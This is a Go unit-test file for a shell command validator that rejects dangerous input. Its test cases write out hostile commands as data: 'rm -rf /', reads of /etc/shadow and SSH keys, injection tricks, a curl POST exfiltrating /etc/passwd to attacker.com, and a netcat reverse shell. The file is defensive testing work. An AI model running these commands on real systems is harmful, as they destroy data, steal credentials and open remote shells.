package managers

import (
	"testing"
)

func TestCommandValidator_ValidateCommand(t *testing.T) {
	validator := NewCommandValidator()

	tests := []struct {
		name    string
		cmd     []string
		wantErr bool
		errMsg  string
	}{
		{
			name:    "Empty command",
			cmd:     []string{},
			wantErr: true,
			errMsg:  "empty command",
		},
		{
			name:    "Safe command - ls",
			cmd:     []string{"ls", "-la"},
			wantErr: false,
		},
		{
			name:    "Safe command - ps",
			cmd:     []string{"ps", "aux"},
			wantErr: false,
		},
		{
			name:    "Dangerous command - rm",
			cmd:     []string{"rm", "-rf", "/"},
			wantErr: true,
			errMsg:  "rm' is not allowed",
		},
		{
			name:    "Dangerous command - shutdown",
			cmd:     []string{"shutdown", "-h", "now"},
			wantErr: true,
			errMsg:  "shutdown' is not allowed",
		},
		{
			name:    "Dangerous command - sudo",
			cmd:     []string{"sudo", "rm", "-rf", "/"},
			wantErr: true,
			errMsg:  "sudo' is not allowed",
		},
		{
			name:    "Command chaining attempt - &&",
			cmd:     []string{"ls", "-la", "&&", "rm", "-rf", "/"},
			wantErr: true,
			errMsg:  "contains blocked pattern",
		},
		{
			name:    "Command chaining attempt - ||",
			cmd:     []string{"false", "||", "cat", "/etc/passwd"},
			wantErr: true,
			errMsg:  "contains blocked pattern",
		},
		{
			name:    "Command chaining attempt - semicolon",
			cmd:     []string{"ls", ";", "cat", "/etc/passwd"},
			wantErr: true,
			errMsg:  "contains blocked pattern",
		},
		{
			name:    "Pipe attempt",
			cmd:     []string{"cat", "/etc/passwd", "|", "grep", "root"},
			wantErr: true,
			errMsg:  "contains blocked pattern",
		},
		{
			name:    "Redirection attempt - output",
			cmd:     []string{"echo", "malicious", ">", "/etc/passwd"},
			wantErr: true,
			errMsg:  "contains blocked pattern",
		},
		{
			name:    "Redirection attempt - input",
			cmd:     []string{"cat", "<", "/etc/shadow"},
			wantErr: true,
			errMsg:  "contains blocked pattern",
		},
		{
			name:    "Command substitution - backtick",
			cmd:     []string{"echo", "`whoami`"},
			wantErr: true,
			errMsg:  "contains blocked pattern",
		},
		{
			name:    "Command substitution - $()",
			cmd:     []string{"echo", "$(whoami)"},
			wantErr: true,
			errMsg:  "contains blocked pattern",
		},
		{
			name:    "Variable expansion",
			cmd:     []string{"echo", "${PATH}"},
			wantErr: true,
			errMsg:  "contains blocked pattern",
		},
		{
			name:    "Path traversal attempt",
			cmd:     []string{"cat", "../../etc/passwd"},
			wantErr: true,
			errMsg:  "blocked pattern", // Changed from "path traversal detected"
		},
		{
			name:    "Home directory expansion",
			cmd:     []string{"cat", "~/.ssh/id_rsa"},
			wantErr: true,
			errMsg:  "contains blocked pattern",
		},
		{
			name:    "Wildcard attempt",
			cmd:     []string{"rm", "/tmp/*"},
			wantErr: true,
			errMsg:  "rm' is not allowed", // Blocked by command blacklist first
		},
		{
			name:    "Null byte injection",
			cmd:     []string{"cat", "/etc/passwd\x00ignored"},
			wantErr: true,
			errMsg:  "null byte detected",
		},
		{
			name:    "Excessively long argument",
			cmd:     []string{"echo", string(make([]byte, 2000))},
			wantErr: true,
			errMsg:  "argument too long",
		},
		{
			name:    "Newline injection",
			cmd:     []string{"echo", "test\nmalicious_command"},
			wantErr: true,
			errMsg:  "contains blocked pattern",
		},
		{
			name:    "Case insensitive blocking - RM",
			cmd:     []string{"RM", "-rf", "/"},
			wantErr: true,
			errMsg:  "rm' is not allowed",
		},
		{
			name:    "Network command - curl",
			cmd:     []string{"curl", "http://malicious.com/exfiltrate"},
			wantErr: true,
			errMsg:  "curl' is not allowed",
		},
		{
			name:    "Network command - wget",
			cmd:     []string{"wget", "http://malicious.com/malware"},
			wantErr: true,
			errMsg:  "wget' is not allowed",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validator.ValidateCommand(tt.cmd)
			if tt.wantErr {
				if err == nil {
					t.Errorf("ValidateCommand() expected error containing %q, got nil", tt.errMsg)
				} else if !contains(err.Error(), tt.errMsg) {
					t.Errorf("ValidateCommand() error = %v, want error containing %q", err, tt.errMsg)
				}
			} else {
				if err != nil {
					t.Errorf("ValidateCommand() unexpected error = %v", err)
				}
			}
		})
	}
}

func TestCommandValidator_AddRemoveCommands(t *testing.T) {
	validator := NewCommandValidator()

	// Test adding to whitelist
	validator.AddAllowedCommand("custom-cmd")
	if !validator.IsCommandAllowed("custom-cmd") {
		t.Error("AddAllowedCommand() failed to add command")
	}

	// Test case insensitivity
	if !validator.IsCommandAllowed("CUSTOM-CMD") {
		t.Error("Command allowlist is not case insensitive")
	}

	// Test removing from whitelist
	validator.RemoveAllowedCommand("custom-cmd")
	if validator.IsCommandAllowed("custom-cmd") {
		t.Error("RemoveAllowedCommand() failed to remove command")
	}

	// Test adding to blacklist
	validator.AddBlockedCommand("dangerous-cmd")
	if !validator.IsCommandBlocked("dangerous-cmd") {
		t.Error("AddBlockedCommand() failed to add command")
	}

	// Test removing from blacklist
	validator.RemoveBlockedCommand("dangerous-cmd")
	if validator.IsCommandBlocked("dangerous-cmd") {
		t.Error("RemoveBlockedCommand() failed to remove command")
	}
}

func TestCommandValidator_RealWorldScenarios(t *testing.T) {
	validator := NewCommandValidator()

	tests := []struct {
		name    string
		cmd     []string
		wantErr bool
		desc    string
	}{
		{
			name:    "Legitimate log viewing",
			cmd:     []string{"cat", "/var/log/app.log"},
			wantErr: false,
			desc:    "Should allow viewing log files",
		},
		{
			name:    "Legitimate process listing",
			cmd:     []string{"ps", "aux"},
			wantErr: false,
			desc:    "Should allow listing processes",
		},
		{
			name:    "Legitimate environment check",
			cmd:     []string{"env"},
			wantErr: false,
			desc:    "Should allow viewing environment variables",
		},
		{
			name:    "Attempted privilege escalation",
			cmd:     []string{"sudo", "bash"},
			wantErr: true,
			desc:    "Should block privilege escalation",
		},
		{
			name:    "Attempted data exfiltration",
			cmd:     []string{"curl", "-X", "POST", "-d", "@/etc/passwd", "http://attacker.com"},
			wantErr: true,
			desc:    "Should block data exfiltration attempts",
		},
		{
			name:    "Attempted reverse shell",
			cmd:     []string{"nc", "-e", "/bin/bash", "attacker.com", "4444"},
			wantErr: true,
			desc:    "Should block reverse shell attempts",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := validator.ValidateCommand(tt.cmd)
			if tt.wantErr && err == nil {
				t.Errorf("%s: expected error but got nil", tt.desc)
			}
			if !tt.wantErr && err != nil {
				t.Errorf("%s: unexpected error: %v", tt.desc, err)
			}
		})
	}
}

// contains checks if a string contains a substring
func contains(s, substr string) bool {
	return len(s) >= len(substr) && (s == substr || len(substr) == 0 ||
		(len(s) > 0 && len(substr) > 0 && indexOfSubstring(s, substr) >= 0))
}

// indexOfSubstring returns the index of the first instance of substr in s, or -1 if substr is not present
func indexOfSubstring(s, substr string) int {
	n := len(substr)
	if n == 0 {
		return 0
	}
	if n > len(s) {
		return -1
	}
	for i := 0; i <= len(s)-n; i++ {
		if s[i:i+n] == substr {
			return i
		}
	}
	return -1
}
